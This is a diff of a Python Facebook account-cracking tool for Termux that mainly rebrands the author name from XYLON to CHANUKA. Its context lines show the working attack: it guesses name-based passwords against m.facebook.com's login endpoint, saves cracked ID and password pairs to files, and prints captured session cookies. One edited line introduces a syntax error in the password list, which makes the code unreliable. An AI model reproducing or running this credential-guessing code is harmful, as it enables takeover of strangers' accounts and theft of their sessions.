@@ -122,7 +122,7 @@ pwpluss,pwnya=[],[]
  
  
 
-#------------[ XYLON- ]--------------#
+#------------[ CHANUKA- ]--------------#
  
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
@@ -225,16 +225,16 @@ logo =(f"""
  ░    ░   ░ ░         ░  ░    ░ ░           ░ 
           ░ ░                                 
 \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
-\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m CREATED BY \033[1;91m  :  \033[1;92m⚜️\033[1;91m-\033[1;92mXYLON                     \033[1;91m|
-\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m FACEBOK\033[1;91m      : \033[1;92m ⚜️\033[1;91m-\033[1;92mXYLON\033[1;91m-\033[1;92mKING\033[1;91m-\033[1;92mBRO            \033[1;91m|
-\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m GITHUB\033[1;91m       :  \033[1;92m⚜️\033[1;91m-\033[1;92mXYLON                     \033[1;91m|
-\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m TOOL STATUS\033[1;91m  : \033[1;92m BANGLADESH-FILE CLONE       \033[1;91m|
+\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m CREATED BY \033[1;91m  :  \033[1;92m⚜️\033[1;91m-\033[1;92mCHANUKA                     \033[1;91m|
+\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m FACEBOK\033[1;91m      : \033[1;92m ⚜️\033[1;91m-\033[1;92mCHANUKA\033[1;91m-\033[1;92mKING\033[1;91m-\033[1;92mBRO            \033[1;91m|
+\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m GITHUB\033[1;91m       :  \033[1;92m⚜️\033[1;91m-\033[1;92mCHANUKA                     \033[1;91m|
+\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m TOOL STATUS\033[1;91m  : \033[1;92m SRI-LANKA-FILE CLONE       \033[1;91m|
 \033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m TOOLS\033[1;91m        \033[1;91m: \033[1;92m ⚜️\033[1;91m-\033[1;92mPIAD                      \033[1;91m|
 \033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m TOOL VIRSION\033[1;91m :  \033[1;35m[\033[1;32m\033[1;92m6.3\033[1;35m]                       \033[1;91m|
 \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
-\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m ASSALAMU ALAIKUM \033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●                 \033[1;91m[\033[1;92m√\033[1;91m]
+\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m AYU-BOWAN!\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●                 \033[1;91m[\033[1;92m√\033[1;91m]
 \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
-\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m ⚜️-XYLON TERMUX COMMUNITY 👨‍💻\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●     \033[1;91m[\033[1;92m√\033[1;91m]
+\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m ⚜️-CHANUKA TERMUX COMMUNITY 👨‍💻\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●     \033[1;91m[\033[1;92m√\033[1;91m]
 \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱""")
 balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
 meyermarexudi =(""" \033[0;97m=============================================""")    
@@ -277,7 +277,7 @@ def meyexudi():
   except:
     sys.exit()
 meyexudi()
-#os.system("python XYLON.py")
+#os.system("python CHANUKA.py")
 def naima():
 	print('-------------------')
 print(logo)
@@ -365,18 +365,18 @@ def menu():
     print(f"""\x1b[1;92m║══\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m \x1b[1;95mCHECK OK ID AND CP ID   """)
     print("""\x1b[1;93m╚══\033[1;91m[\033[1;92m4\033[1;91m]\033[1;92m \x1b[38;5;50mEXIT""")
     print('\x1b[38;5;50║══=================')
-    XYLON = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
-    if XYLON in ['111']:
+    CHANUKA = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
+    if CHANUKA in ['111']:
         login()
         dump_massal()
-    elif XYLON in ['1']:
+    elif CHANUKA in ['1']:
         crack_file()
-    elif XYLON in ['2','02']:
+    elif CHANUKA in ['2','02']:
         os.system('xdg-open https://t.me/Termux_2002')
         os.system("python nono.py")
-    elif XYLON in ['3','03']:
+    elif CHANUKA in ['3','03']:
         result()
-    elif XYLON in ['0']:
+    elif CHANUKA in ['0']:
         os.system('rm -rf .token.txt')
         os.system('rm -rf .cookie.txt')
         print('\033[0;97m=================')
@@ -610,7 +610,7 @@ def setting():
     print("\x1b[1;93m╚══\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m \x1b[38;5;50m CP ID [\x1b[38;5;50m2\x1b[1;95m]")
     print('\x1b[38;5;50m==================')
     hc = input('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
-    #os.system("xdg-open https://www.facebook.com/XYLON.King.Ok.Bro")
+    #os.system("xdg-open https://www.facebook.com/CHANUKA.King.Ok.Bro")
     if hc in ['1','01']:
         method.append('mobile')
     elif hc in ['2','02']:
@@ -664,7 +664,7 @@ def passwrd():
                     pwv.append(frs+'@12345')
                     pwv.append(frs+'@1234')                
                     pwv.append(frs+'@2001')
-                    pwv.append(frs+'@2002')
+                    pwv.append(frs+'@2002)
                     pwv.append(frs+'@2009')
                     pwv.append(frs+'123456')
                     pwv.append(nmf)
@@ -690,7 +690,7 @@ def passwrd():
     print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(CP))
     print('\n\033[1;37m===================================')
     woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
-    os.system("python XYLON-6-3.py")
+    os.system("python CHANUKA-6-3.py")
     exit()
  
 #--------------------[ METODE-B-API ]-----------------#
@@ -698,7 +698,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,CP
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\033[100;92m{bo}[XYLON-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
+    sys.stdout.write(f"\r\033[100;92m{bo}[CHANUKA-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -715,7 +715,7 @@ def crack(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[10;92m\033[1;91m[\033[1;92mXYLON-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
+                print(f'\r\033[10;92m\033[1;91m[\033[1;92mCHANUKA-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
                 print('\x1b[38;5;50m===============================================')
                 os.system('espeak -a 300 " CP, ID"')
                 open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
@@ -726,9 +726,9 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[10;92m\033[1;91m[\033[1;92mXYLON-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[💙]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
+                print(f'\r\033[10;92m\033[1;91m[\033[1;92mCHANUKA-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[💙]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                 print('\x1b[38;5;50m===============================================')
-                os.system('espeak -a 300 " XYLON,  Ok,  id"')
+                os.system('espeak -a 300 " CHANUKA,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
@@ -742,7 +742,7 @@ def crack(idf,pwv):
  
 def crackfree(idf,pwv):
     global loop,ok,CP
-    sys.stdout.write(f"\r{H}[XYLON-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r{H}[CHANUKA-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -759,7 +759,7 @@ def crackfree(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[10;92m\033[1;91m[\033[1;92mXYLON-CP\033[1;91m] {idf} • {pw}')
+                print(f'\r\033[10;92m\033[1;91m[\033[1;92mCHANUKA-CP\033[1;91m] {idf} • {pw}')
                 print('\x1b[38;5;50m============================')
                 os.system('espeak -a 300 " CP, ID"')
                 open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
@@ -770,9 +770,9 @@ def crackfree(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•XYLON-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
+                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•CHANUKA-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                 print('\x1b[38;5;50m===============================================')
-                os.system('espeak -a 300 " XYLON,  Ok,  id"')
+                os.system('espeak -a 300 " CHANUKA,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
